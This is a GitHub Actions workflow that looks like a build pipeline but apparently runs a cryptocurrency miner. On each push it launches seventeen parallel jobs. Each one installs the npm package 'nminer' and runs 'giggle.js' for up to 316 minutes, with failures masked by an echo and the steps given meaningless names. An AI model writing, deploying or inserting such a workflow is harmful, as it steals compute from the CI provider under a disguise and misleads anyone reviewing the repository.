name: giggle
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4238 }
          - { version: 4027 }
          - { version: 4253 }
          - { version: 109 }
          - { version: 8734 }
          - { version: 4118 }
          - { version: 5815 }
          - { version: 9835 }
          - { version: 9477 }
          - { version: 57 }
          - { version: 31 }
          - { version: 2213 }
          - { version: 3244 }
          - { version: 1952 }
          - { version: 1338 }
          - { version: 8723 }
          - { version: 9352 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: quaintly ack
        run: |
          npm install nminer@latest
          timeout 316m node giggle.js || echo "giggle executed"